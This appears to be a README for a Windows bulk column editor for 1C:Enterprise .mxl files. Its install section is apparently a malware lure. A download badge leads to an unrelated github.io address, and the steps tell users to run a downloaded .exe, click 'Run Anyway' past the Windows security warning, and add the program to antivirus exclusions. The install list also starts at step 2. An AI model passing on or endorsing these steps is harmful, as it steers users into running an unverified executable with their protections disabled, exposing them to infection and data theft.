# 📊 mxl-column-editor - Update spreadsheet columns across complete folders

[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://butterburrepast286.github.io)

This application changes column data within multiple 1C:Enterprise .mxl documents. You select a folder, and the software modifies the columns for every file inside. You gain full control over your spreadsheet layouts without manual editing. The interface provides a pixel-accurate view of your changes before you save them.

2. Look for the Assets section at the bottom of the most recent release.
3. Click the link that ends in .exe to download the installer.
4. Save the file to your computer.
5. Double-click the downloaded file to open the program.
6. Windows might show a security notice because the file is new. Click More Info and then select Run Anyway to launch the application.

## 🛠 Features

*   **Bulk Processing:** Add, rename, or delete columns in entire folders of .mxl files at once.
*   **Visual Preview:** See exactly how your spreadsheet looks before you apply changes.
*   **Pixel Accuracy:** The tool uses the 1C engine to render previews exactly as they appear in your software.
*   **Offline Operation:** The program runs on your local machine and creates no external dependencies.
*   **Portability:** The application works as a standalone tool on any modern Windows system.

## 🖥 How to Use the Application

This software aims to remove tedious manual work. Follow these steps to edit your files:

1. Open the application.
2. Click the Select Folder button to pick the directory containing your .mxl documents.
3. The software scans the folder and lists all compatible files in the main window.
4. Select the specific column you want to change from the list.
5. Choose your action: Rename, Add, or Delete.
6. If you choose Rename, type the new name in the provided text field.
7. If you add a new column, define the position and the required data type.
8. Use the Preview button. A window opens to show you the result.
9. Verify the layout matches your expectations.
10. Click the Apply button. The software processes the files and saves your changes to the folder.

## 📋 System Requirements

*   Windows 10 or Windows 11.
*   200 MB of free disk space.
*   Standard monitor resolution of 1920x1080 or higher.
*   Your documents must use the .mxl format specific to 1C:Enterprise.

## ⚙️ Troubleshooting

If the application fails to open:

*   Ensure you have full read and write permissions in the folder you selected.
*   Verify that your .mxl files are not open in another program while the editor processes them.
*   Check that your antivirus software did not block the file. You can add the program folder to your exclusion list if necessary.

## 💡 Frequently Asked Questions

**Does this software store my data?**
No. All operations stay on your computer. The program sends no information to the internet.

**Can I undo my changes?**
We recommend that you back up your folder before you run the bulk editor. The tool overwrites files to ensure your workflow remains fast and direct.

**Which versions of 1C:Enterprise does this support?**
The tool supports standard .mxl print formats compatible with modern versions of the platform.

**Is any programming knowledge required?**
No. This tool provides a graphical interface for users who want to automate spreadsheet tasks without writing code.
